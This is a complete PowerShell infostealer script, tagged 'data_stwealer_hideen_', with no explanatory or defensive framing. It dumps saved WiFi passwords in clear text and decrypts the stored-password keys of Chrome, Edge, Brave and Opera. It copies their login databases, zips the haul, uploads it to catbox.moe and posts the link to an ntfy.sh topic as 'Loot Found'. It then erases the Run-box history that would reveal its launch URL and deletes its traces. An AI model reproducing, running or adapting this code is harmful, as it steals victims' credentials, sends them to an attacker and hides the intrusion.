$topic = "data_stwealer_hideen_"

# 1. Load Security
try {
    Add-Type -AssemblyName System.Security
} catch { exit }

# 2. Workspace Setup
$dir = "$env:TEMP\SysCache_$(Get-Random)"; $zip = "$env:TEMP\UpdatePkg.zip"
if (Test-Path $dir) { Remove-Item -Recurse -Force $dir }; mkdir $dir | Out-Null

# 3. WiFi Export
netsh wlan export profile folder=$dir key=clear | Out-Null

# 4. Browser Looting (v2.4 Logic)
$browsers = @{
    "Chrome"  = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
    "Edge"    = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
    "Brave"   = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State"
    "Opera"   = "$env:APPDATA\Opera Software\Opera Stable\Local State"
}

foreach ($b in $browsers.Keys) {
    $path = $browsers[$b]
    if (Test-Path $path) {
        try {
            $json = Get-Content $path -Raw | ConvertFrom-Json
            $eK = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
            $uK = [System.Security.Cryptography.ProtectedData]::Unprotect($eK[5..($eK.Length-1)], $null, 'CurrentUser')
            [System.BitConverter]::ToString($uK) -replace '-' | Out-File "$dir\${b}_key.txt"
            
            $db = $path.Replace("Local State", "Default\Login Data")
            if ($b -eq "Opera") { $db = $path.Replace("Local State", "Login Data") }
            
            if (Test-Path $db) {
                Copy-Item $db -Destination "$dir\${b}_data.db" -Force -ErrorAction SilentlyContinue
            }
        } catch { continue }
    }
}

# 5. Packaging & Upload
Add-Type -AssemblyName "System.IO.Compression.FileSystem"
[System.IO.Compression.ZipFile]::CreateFromDirectory($dir, $zip)
$link = curl.exe -s -F "reqtype=fileupload" -F "fileToUpload=@$zip" https://catbox.moe/user/api.php

if ($link -like "http*") {
    Invoke-RestMethod -Uri "https://ntfy.sh/$topic" -Method Post -Body "Loot Found: $link"
}

# 6. GHOST CLEANUP & EXIT
# Wipe the Run box history so no one sees the GitHub URL
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue

# Delete the temp files
Remove-Item -Recurse -Force $dir, $zip -ErrorAction SilentlyContinue

# Close the window automatically
exit
